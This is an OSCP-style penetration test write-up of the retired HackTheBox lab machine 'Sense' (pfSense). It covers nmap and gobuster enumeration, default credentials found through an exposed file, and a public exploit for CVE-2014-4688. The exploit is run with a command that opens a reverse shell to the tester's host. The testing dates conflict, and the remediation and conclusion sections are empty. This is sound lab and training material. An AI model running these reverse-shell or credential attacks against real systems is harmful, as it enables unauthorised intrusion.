# HTB Sense - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2025-12-18

---

## 0. Lesson Learned

When exploitation or brute forcing stalls, enumerate harder. The answer came near the end of a large list (`directory-list-2.3-medium.txt`) with an extension (`.txt`) I would normally not search for. 

SSL certificate errors can be worked around with the `verify=False` modification to requests.

---

## 1. Executive Summary

A penetration test was conducted against the target host identified as **Sense**, running pfSense firewall software. The assessment resulted in **full system compromise**, including **administrator web access** and **root-level command execution**. The compromise was achieved through a combination of **information disclosure**, **credential reuse**, and a **known command injection vulnerability** affecting pfSense versions prior to 2.1.4.

The most critical issues identified were:

- Exposure of sensitive files containing valid credentials
- Use of default credentials
- Presence of a known, unpatched command injection vulnerability

Successful exploitation allowed retrieval of both user and root flags, demonstrating complete loss of confidentiality, integrity, and availability.

---

## 2. Scope

- **Target:** 10.129.11.160
- **Environment:** HackTheBox Sense (Retired Machine)
- **Testing Window:** 2025-12-17 to 2024-12-18
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP port scan was performed with Nmap:

```
nmap -p- -sCV 10.129.11.160 -T4 -oA sense_initial
```

Identifying two open services:

- **80/tcp** - HTTP (redirects to HTTPS)
- **443/tcp** - HTTPS (self-signed certificate)

Service fingerprinting revealed **lighttpd 1.4.35** hosting a **pfSense web interface**.

---

## 5. Web Enumeration

Directory enumeration was performed against the HTTPS service with certificate validation disabled using Gobuster:

```
gobuster dir -u https://10.129.11.160 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -k
```

Several directories and files were identified, including:

- `/index.html`
- `/system-users.txt`
- `/changelog.txt`

The web interface confirmed the application as **pfSense**, and further inspection suggested the version was outdated.

---

## 6. Initial Access

### Information Disclosure - `system-users.txt`

A publicly accessible file, `system-users.txt`, was discovered. This file disclosed a valid username and indicated the use of default credentials.

### Weak / Default Credentials

Using the disclosed information, authentication to the pfSense administrative portal was successful with the following credentials:

- **Username:** rohit
- **Password:** pfsense

Authentication revealed the system was running **pfSense version 2.1.3**.

### Command Injection - pfSense < 2.1.4

The target version was confirmed vulnerable to a known command injection flaw in `status_rrd_graph_img.php` (CVE-2014-4688).

This vulnerability allows authenticated users to execute arbitrary system commands via crafted GET parameters.

An existing public exploit was modified to bypass SSL certificate validation by adding `verify=False` to the `login_request` and `exploit_request`.

The exploit was run:

```
python3 43560.py --rhost 10.129.11.160 --lhost 10.10.14.10 --lport 443 --username rohit --password pfsense
```

And successfully triggered the command injection vulnerability returning a **reverse shell as the root user**. No additional privilege escalation was required.

---

## 7. Proof of Compromise

**User Flag**: *REDACTED*

```
cat home/rohit/user.txt
```

**Root Flag**: *REDACTED*

```
cat root/root.txt
```

---

## 8. Key Vulnerabilities Identified

| Vulnerability | Severity | Description | Impact |
|---------------|----------|-------------|--------|
|||||
|||||

---

## 9. Remediation Recommendations



---

## 10. Conclusion



---

## 11. Appendix

### Exploits